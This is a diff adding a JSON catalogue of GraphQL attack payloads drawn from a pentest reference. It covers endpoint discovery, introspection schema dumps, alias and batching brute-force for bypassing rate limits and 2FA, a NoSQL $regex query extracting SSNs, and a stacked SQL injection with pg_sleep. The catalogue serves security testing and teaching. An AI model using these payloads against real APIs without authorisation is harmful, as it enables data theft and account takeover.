@@ -1,0 +1,242 @@
+{
+  "category": "GraphQL Injection",
+  "source": "PayloadsAllTheThings/GraphQL Injection/",
+  "entries": [
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Common GraphQL endpoint paths",
+      "language": "text",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "/v1/explorer\n/v1/graphiql\n/graph\n/graphql\n/graphql/console/\n/graphql.php\n/graphiql\n/graphiql.php"
+    },
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Where to look and how to fingerprint the endpoint",
+      "language": "text",
+      "tags": ["detection", "recon", "methodology"],
+      "body": "GraphQL endpoints often live on predictable paths. The most common ones:\n• /graphql\n• /graphiql - an interactive IDE\nAlways check both the API and the dev/debug interfaces.\nExtended wordlist: SecLists/Discovery/Web-Content/graphql.txt."
+    },
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Finding the injection point - GET endpoint",
+      "language": "http",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "GET /graphql?query={yourQueryHere}\nGET /graphql?query={__schema{types{name}}}\nGET /graphiql?query={__schema{types{name}}}\nGET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D"
+    },
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Finding the injection point - POST endpoint",
+      "language": "http",
+      "tags": ["detection", "graphql", "recon"],
+      "body": "POST /graphql/v1 HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n\"query\": \"query { user { id name } }\"\n}"
+    },
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Checking error visibility (broken queries)",
+      "language": "graphql",
+      "tags": ["detection", "error-based"],
+      "body": "?query={__schema}\n?query={}\n?query={thisdefinitelydoesnotexist}"
+    },
+    {
+      "subcategory": "Endpoint discovery",
+      "title": "Diagram: GraphQL returns login and password (HTB Help)",
+      "language": "image",
+      "tags": ["detection", "graphql", "example"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/graphql-injection/htb-help.png",
+        "caption": "The request GET /graphql?query={user{username,password}} returns, in JSON, the username \"helpme@helpme.com\" and the password hash. Example from HTB Help - the data is served without authorization. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "Minimal introspection query",
+      "language": "json",
+      "tags": ["introspection", "graphql", "enumeration"],
+      "body": "{\n  \"query\": \"{ __schema { types { name } } }\"\n}"
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "How introspection works",
+      "language": "text",
+      "tags": ["introspection", "methodology"],
+      "body": "The GraphQL specification has the service fields __schema and __type - they let the client ask the server which types exist, which fields they return and how everything is related.\nThis is exactly what powers autocompletion and inline documentation in GraphiQL and GraphQL Playground: the tool does not guess, it asks the server in advance what is valid.\nFor an attacker, introspection is a full dump of the schema: types, fields, arguments, mutations."
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "Full schema dump (IntrospectionQuery, URL-encoded)",
+      "language": "text",
+      "tags": ["introspection", "dump", "url-encoded"],
+      "body": "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "Full schema dump (IntrospectionQuery, URL-decoded)",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "schema"],
+      "body": "fragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "Schema dump in one line without fragments",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "oneliner"],
+      "body": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}"
+    },
+    {
+      "subcategory": "Introspection",
+      "title": "Schema dump in one line with fragments",
+      "language": "graphql",
+      "tags": ["introspection", "dump", "oneliner"],
+      "body": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"
+    },
+    {
+      "subcategory": "Schema enumeration",
+      "title": "Schema enumeration via suggestions",
+      "language": "json",
+      "tags": ["enumeration", "suggestions", "bypass"],
+      "body": "{\n  \"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",\n}"
+    },
+    {
+      "subcategory": "Schema enumeration",
+      "title": "Suggestions and brute-force when introspection is disabled",
+      "language": "text",
+      "tags": ["enumeration", "suggestions", "bruteforce"],
+      "body": "If you enter an unknown field, the GraphQL backend often returns a suggestion with a similar name from the schema (Did you mean ...?).\nThis enables schema enumeration even when introspection is disabled.\nWhen the schema is unavailable, you can brute-force known field and type names with wordlists like Escape-Technologies/graphql-wordlist."
+    },
+    {
+      "subcategory": "Schema enumeration",
+      "title": "Enumerating a type definition (using User as an example)",
+      "language": "graphql",
+      "tags": ["enumeration", "type", "schema"],
+      "body": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}"
+    },
+    {
+      "subcategory": "Schema enumeration",
+      "title": "Finding paths to a target type (graphql-path-enum)",
+      "language": "bash",
+      "tags": ["enumeration", "path-enum", "tooling"],
+      "body": "graphql-path-enum -i ./test_data/h1_introspection.json -t Skill\nFound 27 ways to reach the \"Skill\" node from the \"Query\" node:\n- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill\n- Query (query) -> Query (skills) -> Skill"
+    },
+    {
+      "subcategory": "Schema enumeration",
+      "title": "Why find paths to a type",
+      "language": "text",
+      "tags": ["enumeration", "path-enum", "methodology"],
+      "body": "After introspection it is not always obvious how to reach the type you want (User, Admin, Payment) - an object may be reachable through several entry points and nested relations.\ngraphql-path-enum takes the JSON output of introspection, analyzes the type relations and outputs all query paths that can reach the target object, even one that is deeply nested or exposed indirectly."
+    },
+    {
+      "subcategory": "Queries",
+      "title": "Basic query (shorthand)",
+      "language": "graphql",
+      "tags": ["query", "graphql", "methodology"],
+      "body": "{\n  user {\n    id\n    name\n  }\n}"
+    },
+    {
+      "subcategory": "Queries",
+      "title": "Basic query (full syntax with query)",
+      "language": "graphql",
+      "tags": ["query", "graphql", "methodology"],
+      "body": "query {\n  user {\n    id\n    name\n  }\n}"
+    },
+    {
+      "subcategory": "Queries",
+      "title": "Query with arguments (entry point for IDOR)",
+      "language": "graphql",
+      "tags": ["query", "idor", "arguments"],
+      "body": "{\n  user(id: \"1\") {\n    name\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Queries",
+      "title": "Nested query (traverse relations in a single request)",
+      "language": "graphql",
+      "tags": ["query", "nested", "graphql"],
+      "body": "{\n  user(id: \"1\") {\n    name\n    posts {\n      title\n      comments {\n        content\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Queries",
+      "title": "Notes on queries and IDOR",
+      "language": "text",
+      "tags": ["query", "idor", "methodology"],
+      "body": "GraphQL supports three operation types: queries, mutations, subscriptions.\n• The query structure mirrors the JSON response structure exactly: you request only the fields you need.\n• Field arguments work like function parameters (id, filters, search) - this is a frequent entry point for testing access control and IDOR.\n• Nested queries let you traverse relations in a single request (user -> posts -> comments) instead of a chain of REST calls."
+    },
+    {
+      "subcategory": "Mutations",
+      "title": "Mutation - login and user creation",
+      "language": "graphql",
+      "tags": ["mutation", "graphql", "abuse"],
+      "body": "mutation{\n  signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){\n      token\n    }\n}\n\nmutation{\n  addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {\n    id\n    name\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Mutations",
+      "title": "Notes on mutations",
+      "language": "text",
+      "tags": ["mutation", "methodology"],
+      "body": "A mutation is an operation that changes data on the server (create / update / delete).\nMutations work like functions: you use them to interact with the GraphQL endpoint.\nImportant: mutations usually do NOT work over GET (graphql-over-http issue #123)."
+    },
+    {
+      "subcategory": "Batching and aliases",
+      "title": "Batching via a JSON array of queries",
+      "language": "json",
+      "tags": ["batching", "bruteforce", "rate-limit"],
+      "body": "[\n    {\n        \"query\":\"...\"\n    },{\n        \"query\":\"...\"\n    }\n    ,{\n        \"query\":\"...\"\n    }\n    ,{\n        \"query\":\"...\"\n    }\n    ...\n]"
+    },
+    {
+      "subcategory": "Batching and aliases",
+      "title": "Batching by query name",
+      "language": "json",
+      "tags": ["batching", "bruteforce", "rate-limit"],
+      "body": "{\n    \"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"\n}"
+    },
+    {
+      "subcategory": "Batching and aliases",
+      "title": "Brute-force via aliases in a single mutation",
+      "language": "graphql",
+      "tags": ["batching", "aliasing", "bruteforce"],
+      "body": "mutation {\n  login(pass: 1111, username: \"bob\")\n  second: login(pass: 2222, username: \"bob\")\n  third: login(pass: 3333, username: \"bob\")\n  fourth: login(pass: 4444, username: \"bob\")\n}"
+    },
+    {
+      "subcategory": "Batching and aliases",
+      "title": "Why batching and aliases",
+      "language": "text",
+      "tags": ["batching", "rate-limit", "methodology"],
+      "body": "GraphQL batching lets you send several queries in one HTTP request (an array of operations in the body). The server processes each operation and returns an array of responses.\nTypical abuse scenarios:\n• Amplifying password brute-force (many attempts in one request).\n• Bypassing rate limiting.\n• Bypassing 2FA.\nAliases (second:, third: ...) let you call the same mutation many times in one request - the same effect for brute-force."
+    },
+    {
+      "subcategory": "Injection via resolvers",
+      "title": "NoSQL injection via $regex in the search parameter",
+      "language": "graphql",
+      "tags": ["nosqli", "injection", "regex"],
+      "body": "{\n  doctors(\n    options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", \n    search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")\n    {\n      firstName lastName id patients{ssn}\n    }\n}"
+    },
+    {
+      "subcategory": "Injection via resolvers",
+      "title": "SQL injection - breaking out with a single quote",
+      "language": "graphql",
+      "tags": ["sqli", "injection", "detection"],
+      "body": "{ \n    bacon(id: \"1'\") { \n        id, \n        type, \n        price\n    }\n}"
+    },
+    {
+      "subcategory": "Injection via resolvers",
+      "title": "SQL injection inside a GraphQL field (stacked + sleep)",
+      "language": "graphql",
+      "tags": ["sqli", "injection", "time-based"],
+      "body": "query {\n  user(name: \"patt';SELECT 1;SELECT pg_sleep(30);--'\") {\n    id\n    email\n  }\n}"
+    },
+    {
+      "subcategory": "Injection via resolvers",
+      "title": "Note on SQLi/NoSQLi in GraphQL",
+      "language": "text",
+      "tags": ["injection", "sqli", "nosqli"],
+      "body": "GraphQL is just a layer between the client and the database, so SQL and NoSQL injections are still possible.\nTry to push a payload into any resolver parameter (id, name, search, filters).\n• SQLi: a single quote ' to break out, then stacked queries and time-based (pg_sleep).\n• NoSQLi: JSON operators like $regex inside string filter parameters."
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools for attacking GraphQL",
+      "language": "text",
+      "tags": ["tools", "graphql", "tooling"],
+      "body": "GraphQLmap - an engine for interacting with a GraphQL endpoint during a pentest.\nInQL (doyensec) - a Burp extension for GraphQL security testing.\nGQLSpection - parses the introspection schema and generates possible queries.\ngraphql-path-enum - enumerates the ways to reach a given type in the schema.\nclairvoyancex - recovers the GraphQL schema when introspection is disabled.\nCrackQL - GraphQL password brute-force and fuzzing.\ngraphql-cop - a security auditor for GraphQL APIs.\ngraphw00f - fingerprints the GraphQL server engine.\ngraphql-voyager - visualizes any GraphQL API as an interactive graph."
+    }
+  ]
+}
